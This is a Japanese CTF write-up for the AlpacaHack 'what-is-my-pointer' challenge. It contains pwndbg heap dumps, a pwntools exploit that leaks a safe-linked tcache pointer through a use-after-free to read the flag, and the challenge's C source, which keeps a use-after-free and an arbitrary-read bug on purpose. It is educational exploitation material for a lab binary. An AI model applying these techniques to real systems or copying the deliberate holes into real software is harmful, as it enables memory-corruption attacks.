---
title: Daily AlpacaHack - what-is-my-pointer
layout: default
parent: Writeups
nav_order: 1
---

# Daily AlpacaHack - what-is-my-pointer
## 問題
![問題画面](/assets/img/writeups/dailyalpacahack-whatismypointer/challenge.png)

## 解法
### 要約
Use-After-Free脆弱性を利用し、free済みchunkのfdをリーク。
リークされたヒープのアドレスを利用し、ヒープに格納されたflag.txtの情報を表示。

### flag.txtはどこに？
バイナリを実行し、初めてmain関数内のscanfが呼び出されたタイミングでヒープは以下のようになっている。
```
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x59ef65fc8000
Size: 0x290 (with flag bits: 0x291)

Allocated chunk | PREV_INUSE
Addr: 0x59ef65fc8290
Size: 0x1e0 (with flag bits: 0x1e1)

Allocated chunk | PREV_INUSE
Addr: 0x59ef65fc8470
Size: 0x1010 (with flag bits: 0x1011)

Allocated chunk | PREV_INUSE
Addr: 0x59ef65fc9480
Size: 0x20 (with flag bits: 0x21)

Top chunk | PREV_INUSE
Addr: 0x59ef65fc94a0
Size: 0x1fb60 (with flag bits: 0x1fb61)
```
main関数からmenu()が呼び出される前に、flag.txtはヒープ上にコピーされている。
つまり:
```
Allocated chunk | PREV_INUSE
Addr: 0x59ef65fc9480
Size: 0x20 (with flag bits: 0x21)
```
ここにflag.txtの内容が格納されている。

もちろんアドレスは実行するたびに変化するため、何らかの方法でアドレスをリークする必要がある。
なお、heapの先頭アドレスは0x1000の倍数になるようにアライメントされるため、flagの格納されているアドレスは
`0x?????????490`のようになる。
### バイナリの仕様
```
❯ ./chal
1. allocate
2. free
3. read
4. print pointer
choice>
```
ターゲットバイナリは上記のように4つの機能を選んで実行できる。
1 -> 0x20bytesのmalloc
2 -> 1で確保したメモリのfree (なお、この際free後のポインタはNULLで初期化されていない。)
3 -> 1で確保したメモリに格納されている値を表示
4 -> 任意アドレスを入力し、そのメモリアドレスに格納されている値を表示
(詳しい仕様は本writeupの一番下に掲載されたソースコードを参照。)

2でfreeしたメモリのアドレスは、ポインタ変数に格納されたままなので、2 -> 3と実行すれば、freeしたメモリに格納されている値を表示することができる。(Use-After-Free)

つまり、1 -> 2 -> 3と単に順番に選択すれば、freeしたメモリに格納されている値を表示することができる。
実際にその順に選択してみると以下のようになる:
```
choice> 1
choice> 2
choice> 3
M
choice>
```
(あくまで一実行例)

'M'とだけ表示された。
リークされた情報を利用するために、このputsがリークした情報が何なのかを理解する必要がある。
### リークされた情報
freeされたヒープ上のメモリはtcacheにキャッシュされ、そのメモリ上にはtcacheに関連したデータが格納される。
tcacheは単方向リストであり、itemをfreeした後は以下のようなリストになる:
```
(root) -> item -> NULL
```

freeされた各chunkにはfdフィールドがあり、リストの次の要素を指す。
例えば以下のような例を考える:
```
(root) -> A -> B -> C -> NULL
```
tcacheがこのようなリストになっている場合、AのfdにはBを指す情報が、BのfdにはCを指す情報が、Cのfdには```NULL```を指す情報が格納されている。

さきほどの話に戻る。
今の例を踏まえると、itemのfdは```NULL```を指す情報を格納しているはずである。
```
(root) -> item -> NULL
```

結論から言うと、itemのfdに格納されているのはitemのアドレスを12bit右シフトした値である。
(この値はglibc2.32で追加されたSafe-Linkingによるもの)
```zsh
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x60e4294b6000
Size: 0x290 (with flag bits: 0x291)

Allocated chunk | PREV_INUSE
Addr: 0x60e4294b6290
Size: 0x1e0 (with flag bits: 0x1e1)

Allocated chunk | PREV_INUSE
Addr: 0x60e4294b6470
Size: 0x1010 (with flag bits: 0x1011)

Allocated chunk | PREV_INUSE
Addr: 0x60e4294b7480
Size: 0x20 (with flag bits: 0x21)

Free chunk (tcachebins) | PREV_INUSE
Addr: 0x60e4294b74a0
Size: 0x30 (with flag bits: 0x31)
fd: 0x60e4294b7

Top chunk | PREV_INUSE
Addr: 0x60e4294b74d0
Size: 0x1fb30 (with flag bits: 0x1fb31)

pwndbg> x/10gx 0x60e4294b74a0
0x60e4294b74a0: 0x0000000000000000      0x0000000000000031
0x60e4294b74b0: 0x000000060e4294b7      0x631607ae47fa99ae
0x60e4294b74c0: 0x0000000000000000      0x0000000000000000
0x60e4294b74d0: 0x0000000000000000      0x000000000001fb31
0x60e4294b74e0: 0x0000000000000000      0x0000000000000000
```

itemはflag.txtの格納されているメモリ領域のすぐ下に確保される。
そのためflag.txtの格納されているアドレスは
```
0x<リークした値>490
```
となる。

putsのリークはpwntoolsを使って直接受け取ればよい。詳細はsolve.py参照。

アドレスまでわかれば後は4. print pointerを使ってflagを表示できる。
## solve.py
```python
#!/usr/bin/env python3

from pwn import *

def main():
    r = conn()

    r.sendlineafter(b"choice> ", b"1")
    r.sendlineafter(b"choice> ", b"2")
    r.sendlineafter(b"choice> ", b"3")

    value = r.recvline().strip()
    print(value)
    n = int.from_bytes(value, "little")
    s = format(n, "x")
    s = s + "490"
    print(s)

    r.sendlineafter(b"choice> ", b"4")
    r.sendlineafter(b"pointer> ", s.encode())

    r.interactive()


if __name__ == "__main__":
    main()

```
## 問題ソースコード(chal.c)
```c
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

#define __FILE__ "chal.c"

char *item;

void menu() {
    puts("1. allocate");
    puts("2. free");
    puts("3. read");
    puts("4. print pointer");
}

int main(void) {
    FILE *f_ptr = fopen("flag.txt","r");
    if (f_ptr == NULL) {
        puts("open flag.txt failed. please open a ticket"); 
        exit(1);
    }
    fseek(f_ptr,0,SEEK_END);
    long f_sz = ftell(f_ptr);
    fseek(f_ptr,0,SEEK_SET);
    char *flag = malloc(f_sz);
    fgets(flag,f_sz,f_ptr);

    menu();

    while(1) {
        int choice;
        printf("choice> ");
        scanf("%d%*c",&choice);
        switch(choice) {
            case 1: {
                item = malloc(0x20);
            }
            break;
            case 2: {
                assert(item != NULL);
                free(item);
                //item == NULL;
            }
            break;
            case 3: {
                assert(item != NULL);
                puts(item);
            }
            break;
            case 4: {
                printf("pointer> ");
                char *ptr;
                scanf("%p%*c",(void *)&ptr);
                printf("%s\n",ptr);
            }
            break;
            default: {
                exit(0);
            }
        }
    }
}

__attribute__((constructor))
void setup() {
    setbuf(stdin,NULL);
    setbuf(stdout,NULL);
}
```
